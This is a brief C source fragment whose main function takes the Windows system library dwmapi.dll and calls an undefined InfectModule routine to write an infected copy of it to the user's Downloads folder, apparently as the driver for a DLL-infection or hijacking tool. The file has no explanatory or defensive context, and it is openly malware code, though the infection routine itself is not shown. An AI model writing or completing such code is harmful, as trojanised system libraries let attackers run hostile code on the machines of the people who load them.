int main()
{
	CHAR ModulePath[MAX_PATH], InfectedModulePath[MAX_PATH];
	ExpandEnvironmentStringsA("%windir%\\system32\\dwmapi.dll", ModulePath, MAX_PATH-1);
	ExpandEnvironmentStringsA("%userprofile%\\Downloads\\dwmapi.dll", InfectedModulePath, MAX_PATH-1);
	InfectModule(ModulePath, InfectedModulePath);
	getchar();
}